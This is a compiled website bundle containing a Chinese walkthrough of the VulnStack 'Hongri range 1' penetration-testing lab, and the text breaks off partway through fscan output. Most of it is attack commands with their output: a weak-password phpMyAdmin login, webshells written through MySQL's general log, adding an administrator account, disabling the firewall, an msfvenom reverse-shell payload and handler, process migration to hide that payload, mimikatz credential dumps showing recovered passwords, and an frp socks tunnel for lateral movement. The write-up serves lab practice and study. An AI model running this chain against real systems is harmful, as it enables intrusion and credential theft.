"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4673],{28453:(n,e,r)=>{r.d(e,{R:()=>l,x:()=>a});var s=r(96540);const i={},c=s.createContext(i);function l(n){const e=s.useContext(c);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:l(n.components),s.createElement(c.Provider,{value:e},n.children)}},71251:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>d,contentTitle:()=>a,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>t});const s=JSON.parse('{"id":"VulnStack/VulnStack/\u7ea2\u65e5\u9776\u573a1","title":"\u7ea2\u65e5\u9776\u573a1","description":"\u7ea2\u65e5ATT&CK\u7cfb\u5217\u9776\u573a1","source":"@site/docs/VulnStack/VulnStack/\u7ea2\u65e5\u9776\u573a1.md","sourceDirName":"VulnStack/VulnStack","slug":"/VulnStack/VulnStack/\u7ea2\u65e5\u9776\u573a1","permalink":"/docs/VulnStack/VulnStack/\u7ea2\u65e5\u9776\u573a1","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnStack/VulnStack/\u7ea2\u65e5\u9776\u573a1.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnStackSidebar","previous":{"title":"VulnStack","permalink":"/docs/category/vulnstack"},"next":{"title":"Vulntarget","permalink":"/docs/category/vulntarget"}}');var i=r(74848),c=r(28453);const l={},a=void 0,d={},t=[{value:"\u7ea2\u65e5ATT&amp;CK\u7cfb\u5217\u9776\u573a1",id:"\u7ea2\u65e5attck\u7cfb\u5217\u9776\u573a1",level:2},{value:"\u9776\u573a\u642d\u5efa",id:"\u9776\u573a\u642d\u5efa",level:3},{value:"\u4fe1\u606f\u6536\u96c6",id:"\u4fe1\u606f\u6536\u96c6",level:3},{value:"\u8bbf\u95eeweb\u9875\u9762",id:"\u8bbf\u95eeweb\u9875\u9762",level:3},{value:"\u76ee\u5f55\u626b\u63cf",id:"\u76ee\u5f55\u626b\u63cf",level:3},{value:"\u57fa\u4e8e\u65e5\u5fd7\u5199Shell",id:"\u57fa\u4e8e\u65e5\u5fd7\u5199shell",level:3},{value:"\u4e0a\u7ebfMSF",id:"\u4e0a\u7ebfmsf",level:3},{value:"\u57df\u5185\u4fe1\u606f\u6536\u96c6",id:"\u57df\u5185\u4fe1\u606f\u6536\u96c6",level:4},{value:"\u8fc1\u79fb\u8fdb\u7a0b",id:"\u8fc1\u79fb\u8fdb\u7a0b",level:4},{value:"kiwi\u6293\u5bc6\u7801",id:"kiwi\u6293\u5bc6\u7801",level:4},{value:"\u6a2a\u5411\u79fb\u52a8",id:"\u6a2a\u5411\u79fb\u52a8",level:3},{value:"\u642d\u5efasock\u96a7\u9053",id:"\u642d\u5efasock\u96a7\u9053",level:4},{value:"\u5229\u7528fscan\u626b\u63cf",id:"\u5229\u7528fscan\u626b\u63cf",level:4},{value:"nmap\u626b\u63cf",id:"nmap\u626b\u63cf",level:4},{value:"\u6253MS17-010",id:"\u6253ms17-010",level:4},{value:"CVE-2020-1472\u7684\u5229\u7528",id:"cve-2020-1472\u7684\u5229\u7528",level:4},{value:"\u5229\u7528wmiexec\u83b7\u53d6\u5230Shell",id:"\u5229\u7528wmiexec\u83b7\u53d6\u5230shell",level:5},{value:"\u5bc6\u7801\u590d\u539f\u64cd\u4f5c",id:"\u5bc6\u7801\u590d\u539f\u64cd\u4f5c",level:5},{value:"CS\u901f\u901a",id:"cs\u901f\u901a",level:3},{value:"web\u6295\u9012",id:"web\u6295\u9012",level:4},{value:"\u6a2a\u5411\u79fb\u52a8",id:"\u6a2a\u5411\u79fb\u52a8-1",level:4},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:3},{value:"\u53c2\u8003\u94fe\u63a5",id:"\u53c2\u8003\u94fe\u63a5",level:3}];function o(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",h5:"h5",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,c.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:"\u7ea2\u65e5attck\u7cfb\u5217\u9776\u573a1",children:"\u7ea2\u65e5ATT&CK\u7cfb\u5217\u9776\u573a1"}),"\n",(0,i.jsx)(e.h3,{id:"\u9776\u573a\u642d\u5efa",children:"\u9776\u573a\u642d\u5efa"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:["\u6211\u6ca1\u6709\u4f7f\u7528",(0,i.jsx)(e.code,{children:"NAT"}),"\u6a21\u5f0f\u8fdb\u884c\u642d\u5efa\u9776\u673a\uff08\u6211\u73af\u5883\u53ef\u80fd\u6709\u95ee\u9898\uff09\uff0c\u6211\u4f7f\u7528\u7684\u662f\u6865\u63a5\u6a21\u5f0f"]}),"\n"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"win7"}),"\u4e3b\u673a\u7f51\u7edc\u914d\u7f6e"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240506211000134.png",alt:"image-20240506211000134"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e00\u5f20\u7f51\u5361\u914d\u7684\u662f\u6865\u63a5\uff0c\u4e00\u5f20\u662f\u4ec5\u4e3b\u673a\u6a21\u5f0f"}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"Win2K3 Metasploitable"}),"\u548c",(0,i.jsx)(e.code,{children:"Windows Server 2008 R2 x64"}),"\u90fd\u662f\u4e00\u5f20\u4ec5\u4e3b\u673a\u7f51\u5361"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240506211358783.png",alt:"image-20240506211358783"})}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u7684IP\u914d\u7f6e\u5982\u4e0b"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"win7   192.168.170.91 192.168.52.134\r\nWin2K3 Metasploitable  192.168.52.138\r\nWindows Server 2008 R2 x64  192.168.52.141\n"})}),"\n",(0,i.jsx)(e.h3,{id:"\u4fe1\u606f\u6536\u96c6",children:"\u4fe1\u606f\u6536\u96c6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"nmap -p- -T5 -A --min-rate 5000 192.168.170.147\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"PORT     STATE SERVICE VERSION\r\n80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)\r\n|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45\r\n|_http-title: phpStudy \\xE6\\x8E\\xA2\\xE9\\x92\\x88 2014 \r\n3306/tcp open  mysql   MySQL (unauthorized)\n"})}),"\n",(0,i.jsx)(e.h3,{id:"\u8bbf\u95eeweb\u9875\u9762",children:"\u8bbf\u95eeweb\u9875\u9762"}),"\n",(0,i.jsx)(e.p,{children:"\u662fphpStudy\u7684\u63a2\u9488"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240421164448177.png",alt:"image-20240421164448177"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5f97\u5230\u7f51\u7ad9\u7edd\u5bf9\u76ee\u5f55",(0,i.jsx)(e.code,{children:"C:/phpStudy/WWW"})]}),"\n",(0,i.jsx)(e.h3,{id:"\u76ee\u5f55\u626b\u63cf",children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsxs)(e.p,{children:["\u7528",(0,i.jsx)(e.code,{children:"dirsearch"}),"\u626b\u51fa\u4e86",(0,i.jsx)(e.code,{children:"phpmyadmin"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"[01:20:36] 200 -   71KB - /phpinfo.php\r\n[01:20:36] 301 -  242B  - /phpMyAdmin  ->  http://192.168.170.147/phpMyAdmin/\r\n[01:20:36] 301 -  242B  - /phpmyadmin  ->  http://192.168.170.147/phpmyadmin/\r\n[01:20:37] 200 -   32KB - /phpmyadmin/ChangeLog\r\n[01:20:37] 200 -    2KB - /phpmyadmin/README\r\n[01:20:38] 200 -    4KB - /phpMyAdmin/index.php\r\n[01:20:38] 200 -    4KB - /phpmyadmin/index.php\r\n[01:20:38] 200 -    4KB - /phpmyadmin/\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f31\u5bc6\u7801 root root \u767b\u5f55\u6210\u529f"}),"\n",(0,i.jsxs)(e.p,{children:["\u5c1d\u8bd5",(0,i.jsx)(e.code,{children:"outfile"}),"\u5199webshell"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:'select "<?=@eval($_POST[1]);" into outfile "C:/phpStudy/WWW/2.php"'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd4\u56de\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement\r\nMySQL\u670d\u52a1\u5668\u6b63\u5728\u4f7f\u7528--secure-file-priv\u9009\u9879\u8fd0\u884c\uff0c\u56e0\u6b64\u65e0\u6cd5\u6267\u884c\u6b64\u8bed\u53e5\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u67e5\u770b\u76f8\u5173\u9009\u9879\u914d\u7f6e"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-sql",children:"show global variables like '%secure%';\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240503133619763.png",alt:"image-20240503133619763"})}),"\n",(0,i.jsxs)(e.p,{children:["\u8fd9\u91cc\u7684\u503c\u662f",(0,i.jsx)(e.code,{children:"NULL"}),"\u5c31\u662f\u4e0d\u5141\u8bb8\u5bfc\u5165\u5bfc\u51fa"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:"secure_file_priv \u53c2\u6570\u89e3\u6790\uff1a"})}),"\n",(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:"\u53c2\u6570\u503c"}),(0,i.jsx)(e.th,{children:"\u8bf4\u660e"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:"null"}),(0,i.jsx)(e.td,{children:"\u4e0d\u5141\u8bb8\u5bfc\u5165\u5bfc\u51fa"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:"\u6307\u5b9a\u6587\u4ef6\u5939\uff08 C:\\ProgramData\\.. \uff09"}),(0,i.jsx)(e.td,{children:"mysql\u7684\u5bfc\u5165\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728\u6307\u5b9a\u7684\u6587\u4ef6\u5939"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:"secure_file_priv \u4e0d\u8bbe\u7f6e\uff08\u4e3a\u7a7a\uff09"}),(0,i.jsx)(e.td,{children:"\u6ca1\u6709\u4efb\u4f55\u9650\u5236"})]})]})]}),"\n",(0,i.jsx)(e.h3,{id:"\u57fa\u4e8e\u65e5\u5fd7\u5199shell",children:"\u57fa\u4e8e\u65e5\u5fd7\u5199Shell"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"show variables like '%general%';\t\u67e5\u770b\u914d\u7f6e\uff0c\u65e5\u5fd7\u662f\u5426\u5f00\u542f\uff0c\u548cmysql\u9ed8\u8ba4log\u5730\u5740(\u8bb0\u4e0b\u539f\u5730\u5740\u65b9\u4fbf\u6062\u590d)\r\n\r\nset global general_log = on;  \u5f00\u542f\u65e5\u5fd7\u76d1\u6d4b\uff0c\u9ed8\u8ba4\u5173\u95ed(\u5982\u679c\u4e00\u76f4\u5f00\u6587\u4ef6\u4f1a\u5f88\u5927\u7684)\r\n\r\nset global general_log_file = 'C:/phpStudy/WWW/shell.php';  \u8bbe\u7f6e\u65e5\u5fd7\u8def\u5f84\r\n\r\nselect '<?php eval($_POST[shell]);?>';  \u6267\u884c\u67e5\u8be2\uff0c\u5199\u5165shell\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240503134223321.png",alt:"image-20240503134223321"})}),"\n",(0,i.jsx)(e.p,{children:"\u7528\u8681\u5251\u8fde\u63a5"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"net user \u8d26\u6237 \u5bc6\u7801 /add\r\n\u7ba1\u7406\u5458\u6743\u9650\uff0c\u6240\u6709\u76f4\u63a5\u52a0\r\nnet localgroup administrators admin /add\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5173\u9632\u706b\u5899"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"netsh advfirewall show allprofile state\r\nnetsh advfirewall set allprofiles state off\n"})}),"\n"]}),"\n",(0,i.jsx)(e.h3,{id:"\u4e0a\u7ebfmsf",children:"\u4e0a\u7ebfMSF"}),"\n",(0,i.jsx)(e.p,{children:"\u751f\u6210\u4e00\u4e2apayload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.91 LPORT=9999 -f exe > ma.exe\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u4e0a\u4f20\u5230win7\u4e3b\u673a\u4e0a\uff0c\u8bbe\u7f6e\u76d1\u542cIP\u548c\u7aef\u53e3(\u548c\u4e0a\u9762\u4fdd\u6301\u4e00\u81f4)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"msfconsole -q\r\nuse exploit/multi/handler\r\nset payload windows/x64/meterpreter/reverse_tcp\r\nset lhost 192.168.170.91\r\nset lport 9999\r\nrun\n"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u67e5\u8be2\u7528\u6237\u6743\u9650"}),"\n",(0,i.jsx)(e.p,{children:"\u67e5\u770b\u5f53\u524d\u7528\u6237\u547d\u4ee4\uff1awhoami"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsx)(e.li,{children:"\u672c\u5730\u666e\u901a\u7528\u6237\r\n\u4e3b\u673a\u540d\\test"}),"\n",(0,i.jsx)(e.li,{children:"\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237\r\n\u4e3b\u673a\u540d\\administrator"}),"\n",(0,i.jsx)(e.li,{children:"\u57df\u5185\u7528\u6237\r\n\u57df\u540d\\test"}),"\n",(0,i.jsx)(e.li,{children:"\u57df\u5185\u7ba1\u7406\u5458\u7528\u6237\r\n\u57df\u540d\\administrator"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(e.h4,{id:"\u57df\u5185\u4fe1\u606f\u6536\u96c6",children:"\u57df\u5185\u4fe1\u606f\u6536\u96c6"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"net view"})," \u663e\u793a\u5f53\u524d\u57df\u7684\u8ba1\u7b97\u673a\u5217\u8868"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"net view /domain:hack"})," \u67e5\u770bhack\u57df\u4e2d\u7684\u673a\u5668\u5217\u8868"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"net user"})," \u67e5\u770b\u672c\u673a\u7684\u7528\u6237\u5217\u8868"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"net user /domain"})," \u67e5\u770b\u57df\u5185\u7528\u6237\u5217\u8868"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"net user xx /domain"})," \u67e5\u770b\u57df\u5185\u7528\u6237\u7684\u4fe1\u606f"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"net config workstation"})," \u67e5\u770b\u5de5\u4f5c\u7ad9\u4fe1\u606f"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:'net group "domain admins" /domain'})," \u67e5\u770b\u57df\u7684\u7ba1\u7406\u5458\u7528\u6237"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:'net group "Domain Controllers" /domain'})," \u67e5\u770b\u6240\u6709\u57df\u63a7\u5236\u5668"]}),"\n"]}),"\n",(0,i.jsxs)(e.p,{children:["\u6536\u96c6\u7cfb\u7edf\u57fa\u672c\u4fe1\u606f\uff0c\u5f53\u524d\u57df\u662f",(0,i.jsx)(e.code,{children:"GOD"}),"\uff0cwin7\u8fd9\u53f0\u4e3b\u673a\u662f",(0,i.jsx)(e.code,{children:"\u57df\u7ba1\u7406\u5458"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"meterpreter > sysinfo\r\nComputer        : STU1\r\nOS              : Windows 7 (6.1 Build 7601, Service Pack 1).\r\nArchitecture    : x64\r\nSystem Language : zh_CN\r\nDomain          : GOD\r\nLogged On Users : 2\r\nMeterpreter     : x64/windows\r\nmeterpreter > getuid\r\nServer username: GOD\\Administrator\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fdb\u5165shell\uff0c\u67e5\u770b\u5f53\u524d\u57df\u7684\u8ba1\u7b97\u673a\u5217\u8868"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"C:\\>chcp 65001\r\nchcp 65001\r\nActive code page: 65001\r\n\r\nC:\\>net view\r\nnet view\r\nServer Name            Remark\r\n\r\n-------------------------------------------------------------------------------\r\n\\\\OWA\r\n\\\\ROOT-TVI862UBEH\r\n\\\\STU1\r\nThe command completed successfully.\r\n\r\nC:\\>net config workstation\r\nnet config workstation\r\nComputer name                        \\\\STU1\r\nFull Computer name                   stu1.god.org\r\nUser name                            Administrator\r\n\r\nWorkstation active on                \r\n        NetBT_Tcpip_{4DAEBDFD-0177-4691-8243-B73297E2F0FF} (000C298BDFF4)\r\n        NetBT_Tcpip_{42787AAA-9343-4DF8-8F3E-079B3E9670F3} (000C298BDFFE)\r\n        NetBT_Tcpip_{EC57C4EB-763E-4000-9CDE-4D7FF15DF74C} (02004C4F4F50)\r\n\r\nSoftware version                     Windows 7 Professional\r\n\r\nWorkstation domain                   GOD\r\nWorkstation Domain DNS Name          god.org\r\nLogon domain                         GOD\r\n\r\nCOM Open Timeout (sec)               0\r\nCOM Send Count (byte)                16\r\nCOM Send Timeout (msec)              250\r\nThe command completed successfully.\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6709\u4e09\u53f0\u4e3b\u673a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"OWA\r\nROOT-TVI862UBEH\r\nSTU1\n"})}),"\n",(0,i.jsx)(e.p,{children:"ping\u4e00\u4e0b\u5f97\u5230IP\u6216\u8005\u67e5\u770barp\u8868"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-cmd",children:"C:\\>ping ROOT-TVI862UBEH\r\nping ROOT-TVI862UBEH\r\n\r\nPinging ROOT-TVI862UBEH [192.168.52.141] with 32 bytes of data:\r\nReply from 192.168.52.141: bytes=32 time=2ms TTL=128\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"C:\\>arp -a\r\narp -a        \r\n\r\nInterface: 192.168.52.134 --- 0x1a\r\n  Internet Address      Physical Address      Type\r\n  192.168.52.138        00-0c-29-44-6f-62     dynamic   \r\n  192.168.52.141        00-0c-29-c8-f0-62     dynamic   \r\n  192.168.52.255        ff-ff-ff-ff-ff-ff     static    \r\n  224.0.0.22            01-00-5e-00-00-16     static    \r\n  224.0.0.252           01-00-5e-00-00-fc     static    \r\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u5185\u7f51\u8fd8\u6709\u4e24\u53f0\u4e3b\u673aIP\u5206\u522b\u662f"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"192.168.52.138\r\n192.168.52.141\n"})}),"\n",(0,i.jsx)(e.h4,{id:"\u8fc1\u79fb\u8fdb\u7a0b",children:"\u8fc1\u79fb\u8fdb\u7a0b"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:["\u901a\u8fc7msf\u5f97\u5230\u7684\u4f1a\u8bdd\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u5bfc\u81f4\u540e\u6e17\u900f\u5931\u8d25\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u628a",(0,i.jsx)(e.code,{children:"shell"}),"\u7684\u8fdb\u7a0b\u8fc1\u79fb\u7ed1\u5b9a\u5230\u76ee\u6807\u673a\u6b63\u5e38\u7684\u8fdb\u7a0b\u4e2d"]}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"meterpreter > ps\r\n\r\nProcess List\r\n============\r\n\r\n PID   PPID  Name               Arch  Session  User                          Path\r\n ---   ----  ----               ----  -------  ----                          ----\r\n 0     0     [System Process]\r\n 4     0     System             x64   0\r\n 2516  2836  explorer.exe       x64   1        GOD\\Administrator             C:\\Windows\\Explorer.EXE\r\n 3420  3412  ma.exe             x64   1        GOD\\Administrator             C:\\ma.exe\r\nmeterpreter > migrate 2516\r\n[*] Migrating from 3420 to 2516...\r\n[*] Migration completed successfully.\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u6267\u884c",(0,i.jsx)(e.code,{children:"migrate"}),"\u547d\u4ee4\u540e\u5c31\u53ef\u4ee5\u5c06",(0,i.jsx)(e.code,{children:"ma.exe"}),"\u7684\u8fd9\u4e2a\u8fdb\u7a0b\u9690\u85cf"]}),"\n",(0,i.jsx)(e.h4,{id:"kiwi\u6293\u5bc6\u7801",children:"kiwi\u6293\u5bc6\u7801"}),"\n",(0,i.jsx)(e.p,{children:"\u63a5\u7740\u7528MSF\u6293\u54c8\u5e0c\u548c\u5bc6\u7801"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"C:\\>exit\r\nexit\r\nmeterpreter > hashdump\r\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\nliukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\nmeterpreter > load kiwi\r\nLoading extension kiwi...\r\n  .#####.   mimikatz 2.2.0 20191125 (x64/windows)\r\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\r\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\r\n '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )\r\n  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/\r\n\r\nSuccess.\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"meterpreter > creds_all\r\n[+] Running as SYSTEM\r\n[*] Retrieving all credentials\r\nmsv credentials\r\n===============\r\n\r\nUsername       Domain  LM                                NTLM                              SHA1\r\n--------       ------  --                                ----                              ----\r\nAdministrator  GOD     9c4e2bb1a645a64b6d96bbec894387af  6a2ff5138ef3012467338a175e14f440  c465da655e9c19e0e7b82fb8cc147dea4ee7fb48\r\nSTU1$          GOD                                       0ba7dcdc7f5bef947c985490b99228c1  e5c0f994e94ef2ac378ddb8c784bfb33dda7927a\r\n\r\nwdigest credentials\r\n===================\r\n\r\nUsername       Domain  Password\r\n--------       ------  --------\r\n(null)         (null)  (null)\r\nAdministrator  GOD     dabaisec@2024\r\nSTU1$          GOD     \r\n\r\ntspkg credentials\r\n=================\r\n\r\nUsername       Domain  Password\r\n--------       ------  --------\r\nAdministrator  GOD     dabaisec@2024\r\n\r\nkerberos credentials\r\n====================\r\n\r\nUsername       Domain   Password\r\n--------       ------   --------\r\n(null)         (null)   (null)\r\nAdministrator  GOD.ORG  dabaisec@2024\r\nstu1$          god.org  \r\nstu1$          GOD.ORG    \n"})}),"\n",(0,i.jsx)(e.h3,{id:"\u6a2a\u5411\u79fb\u52a8",children:"\u6a2a\u5411\u79fb\u52a8"}),"\n",(0,i.jsx)(e.h4,{id:"\u642d\u5efasock\u96a7\u9053",children:"\u642d\u5efasock\u96a7\u9053"}),"\n",(0,i.jsxs)(e.p,{children:["kali\u4e0afrps\u7684\u914d\u7f6e",(0,i.jsx)(e.code,{children:"frps.ini"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-ini",children:"[common]\r\nbind_port = 7000\r\ntoken = 192408  \r\n\r\ndashboard_port = 7500\r\ndashboard_user = admin\r\ndashboard_pwd = 123456\r\nenable_prometheus = true\r\n\r\nlog_file = /var/log/frps.log\r\nlog_level = info\r\nlog_max_days = 3\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u670d\u52a1\u7aef\u542f\u52a8"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"systemctl start frps\r\n./frps -c ./frps.ini\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5411win7\u9776\u673a\u4e0a\u4f20",(0,i.jsx)(e.code,{children:"frpc.exe"}),"\u548c",(0,i.jsx)(e.code,{children:"frpc.ini"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-ini",children:"[common]\r\nserver_addr = 192.168.170.91\r\nserver_port = 7000\r\ntoken = 192408\r\n\r\n[target1]\r\ntype = tcp\r\nremote_port = 1234\r\nplugin = socks5\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-cmd",children:"start /b frpc.exe\r\n.\\frpc.exe -c .\\frpc.ini\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u8bbe\u7f6e",(0,i.jsx)(e.code,{children:"msf"}),"\u5168\u5c40\u4ee3\u7406"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"setg Proxies socks5:192.168.170.91:1234\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u7f16\u8f91",(0,i.jsx)(e.code,{children:"kali"}),"\u7684",(0,i.jsx)(e.code,{children:"vim /etc/proxychains4.conf"}),"\u52a0\u4e0a"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"socks5 192.168.170.91 1234\n"})}),"\n",(0,i.jsx)(e.h4,{id:"\u5229\u7528fscan\u626b\u63cf",children:"\u5229\u7528fscan\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~]\r\n\u2514\u2500# ./fscan -socks5 socks5://192.168.170.91:1234 -h 192.168.52.138\r\n\r\n   ___                              _    \r\n  / _ \\     ___  ___ _ __ __ _  ___| | __ \r\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\r\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \r\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \r\n                     fscan version: 1.8.3\r\nSocks5Proxy: socks5://192.168.170.91:1234\r\nstart infoscan\r\n192.168.52.138:80 open\r\n192.168.52.138:135 open\r\n192.168.52.138:88 open\r\n192.168.52.138:139 open\r\n192.168.52.138:445 open\r\n[*] alive ports len is: 5\r\nstart vulscan\r\n[*] NetInfo \r\n[*]192.168.52.138\r\n   [->]owa\r\n   [->]192.168.52.138\r\n[+] MS17-010 192.168.52.138     (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)\r\n[*] WebTitle http://192.168.52.138     code:200 len:689    title:IIS7\r\n\u5df2\u5b8c\u6210 5/5\r\n[*] \u626b\u63cf\u7ed3\u675f,\u8017\u65f6: 27.344077356s\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~]\r\n\u2514\u2500# ./fscan -socks5 socks5://192.168.170.91:1234 -h 192.168.52.141\r\n\r\n   ___                              _    \r\n  / _ \\     ___  ___ _ __ __ _  ___| | __ \r\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\r\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \r\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \r\n                     fscan version: 1.8.3\r\nSocks5Proxy: socks5://192.168.170.91:1234\r\nstart infoscan\r\n192.168.52.141:7002 open\r\n192.168.52.141:8098 open\r\n192.168.52.141:8099 